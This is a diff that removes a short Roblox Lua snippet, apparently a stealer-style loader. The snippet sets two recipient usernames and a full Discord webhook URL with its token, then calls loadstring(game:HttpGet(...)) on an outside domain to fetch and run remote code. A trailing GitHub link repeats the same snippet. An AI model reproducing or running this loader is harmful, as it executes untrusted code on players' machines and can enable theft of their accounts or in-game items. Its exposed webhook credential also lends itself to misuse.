@@ -1,6 +1,0 @@
-"Username = "KiraIsDifferent1"
-Username2 = "Execute_7766"
-Webhook = "https://discord.com/api/webhooks/1257230659798171690/QL6FtpnhWUAGxkZQb7FJnjZ5yXXcErtQFkGPtkWjsKeJpZsRxnwhWqURGS_o3dXJw7jQ"
-
-loadstring(game:HttpGet("https://egorikusa.space"))()"
- https://raw.githubusercontent.com/REDzHubBloxFruit/BloxFruit-main-redz9999/main/BloxFruits/main/redz9999#:~:text=Username%20%3D%20%22KiraIsDifferent1%22%0AUsername2%20%3D%20%22Execute_7766%22%0AWebhook%20%3D%20%22https%3A//discord.com/api/webhooks/1257230659798171690/QL6FtpnhWUAGxkZQb7FJnjZ5yXXcErtQFkGPtkWjsKeJpZsRxnwhWqURGS_o3dXJw7jQ%22%0A%0Aloadstring(game%3AHttpGet(%22https%3A//egorikusa.space%22))()
